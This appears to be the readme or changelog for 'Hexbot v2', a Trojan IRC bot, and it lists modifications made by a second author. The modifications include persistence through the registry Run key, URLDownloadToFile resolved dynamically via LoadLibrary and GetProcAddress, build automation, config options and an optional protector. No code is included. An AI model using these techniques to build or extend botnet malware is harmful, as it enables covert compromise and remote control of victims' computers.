Name: Hexbot v2
Author: "Nibble" original, patched and added on by Bull Moose.
Type: Trojan (IRC Bot)
Date: 12/7/09

Modified by Bull Moose to compile correctly on MinGW, added a block of code to copy to registry in 
the "run" key, fixed URLDownloadToFile to get its address using LoadLibrary and GetProcAddress 
to save file size and to compensate for MinGW not having the urlmon library, added a makefile to automate 
compilation, added config.h for easy configuration, added an optional protector (specify -p as the 1st argument for makefile), 
added some options in config.h.